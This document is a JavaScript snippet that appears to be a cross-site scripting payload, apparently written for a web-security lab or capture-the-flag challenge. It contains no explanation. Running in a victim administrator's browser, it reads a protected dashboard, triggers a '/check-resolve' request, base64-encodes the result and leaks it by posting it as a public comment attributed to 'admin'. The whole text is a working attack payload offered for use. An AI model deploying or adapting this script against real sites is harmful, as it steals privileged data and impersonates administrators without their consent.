fetch("/secret-security-dashboard")
  .then(response => response.text()) 
  .then(adminData => {
    return fetch("/check-resolve", {
      method: "POST",
      headers: {
        "Content-Type": "application/x-www-form-urlencoded",
      },
      body: "id=1",
    })
    .then(response => response.text())
    .then(checkResolveData => {
      const postData = new URLSearchParams({
        comment2: btoa(checkResolveData), 
        "comment-author": "admin"
      });
      return fetch("/post-comment", {
        method: "POST",
        headers: {
          "Content-Type": "application/x-www-form-urlencoded",
        },
        body: postData,
      });
    });
  })
  .then(response => response.text())
  .then(finalResult => {
    console.log("Post result:", finalResult);
  })
  .catch(error => {
    console.error("There was a problem with the fetch operation:", error);
  });
